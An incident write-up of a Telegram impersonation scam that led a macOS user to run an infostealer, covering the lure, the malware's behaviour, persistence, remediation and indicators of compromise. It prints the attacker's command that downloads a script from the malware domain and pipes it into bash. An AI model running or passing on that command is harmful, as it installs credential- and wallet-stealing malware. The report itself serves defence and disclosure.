# Social Engineering + Malware Attack

This incident started from a Telegram chat with someone who claimed to be [Mathijs van Esch](https://maven11.com/team) from [Maven 11](https://maven11.com/) capital.

## Incident Overview

The attacker impersonated a high-profile Venture Capital partner to build trust. Using an "exclusive invite" hook, they directed the victim to a phishing site and tricked them into executing a malicious shell command.

## Websites & Communication

- **Platform:** Telegram (Executive Impersonation)
- **Phishing Domain:** `https://speeka.app`
- **Malware Host:** `macos.speeka.app`
- **Social Engineering Tactic:** The scammer used the promise of an exclusive "invite-only" platform and provided a unique code (`98XF9M`) to create a sense of legitimacy and urgency (FOMO).

## Technical Breakdown

### 1. The Entry Point

The victim was instructed to run the following command in the terminal:
`curl -s https://macos.speeka.app/apple/macos/installation/terminal/launcher | nohup bash &`

- **`curl -s`**: Silently downloads the malicious script.
- **`nohup ... &`**: Ensures the process continues running in the background, detached from the terminal session.
- **`bash`**: Executes the downloaded code immediately with user-level permissions.

### 2. Malware Behavior (macOS InfoStealer)

The malware identified in this incident is a variant of the **AMOS (Atomic macOS Stealer)** or **Realst** family.

- **Signature:** The script utilized an AppleScript process (`osascript`) with the internal ID **"xxxblyat"**.
- **Capabilities:**
  - **Data Exfiltration:** Targeted browser profiles (Chrome, Brave) to steal cookies, saved passwords, and auto-fill data.
  - **Crypto Theft:** Scanned for local wallet files (MetaMask, Phantom, etc.) and private key strings.
  - **Persistence:** Installed a hidden LaunchDaemon to ensure the malware restarted automatically upon reboot.
  - **C2 Communication:** Established a "heartbeat" to a Command & Control server to receive remote commands (Reverse Shell).

### 3. Persistence Mechanism

The malware ensured its survival by creating a hidden property list file:

- **Path:** `~/Library/LaunchAgents/com.35591.plist` (or `/Library/LaunchDaemons/`)
- **Logic:** Set to `RunAtLoad` and `KeepAlive`, forcing macOS to restart the script if killed or if the system rebooted.

## Remediation Steps Taken

1.  **Process Termination:** Identified and killed the malicious PID via `ps aux | grep bash`.
2.  **Persistence Removal:** Unloaded and deleted the `com.35591.plist` file.
3.  **Cleanup:** Deleted hidden bot tracking files (`.botid`, `.chost`, `.username`).
4.  **Credential Reset:** Terminated all active sessions on Telegram and Google to invalidate stolen cookies.
5.  **Asset Migration:** Moved cryptocurrency funds to new, non-compromised wallet addresses.

## Indicators of Compromise (IoCs)

| Type       | Value                           |
| :--------- | :------------------------------ |
| **Domain** | speeka.app                      |
| **String** | xxxblyat                        |
| **File**   | com.35591.plist                 |
| **Files**  | ~/.botid, ~/.chost, ~/.username |

## Conclusion

This attack was a textbook example of a "Crypto Drainer" targeting macOS users. The swift identification of the `LaunchDaemon` prevented long-term surveillance, though immediate cookie and credential rotation was required due to the instant exfiltration nature of the script.
